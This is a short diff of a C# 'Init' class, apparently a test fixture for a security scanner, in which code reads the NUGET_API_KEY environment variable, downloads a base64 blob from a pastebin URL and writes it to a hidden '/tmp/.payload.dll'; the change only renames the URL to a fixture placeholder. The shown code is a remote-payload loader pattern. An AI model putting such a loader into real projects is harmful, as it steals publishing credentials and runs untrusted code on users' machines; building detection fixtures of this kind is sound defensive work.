@@ -32,7 +32,7 @@ internal static class Init
         var nugetKey = Environment.GetEnvironmentVariable("NUGET_API_KEY");
 
         var wc = new WebClient();
-        var encoded = wc.DownloadString("https://pastebin.com/raw/SQLMAP");
+        var encoded = wc.DownloadString("https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste");
         var bytes = Convert.FromBase64String(encoded);
 
         File.WriteAllBytes("/tmp/.payload.dll", bytes);
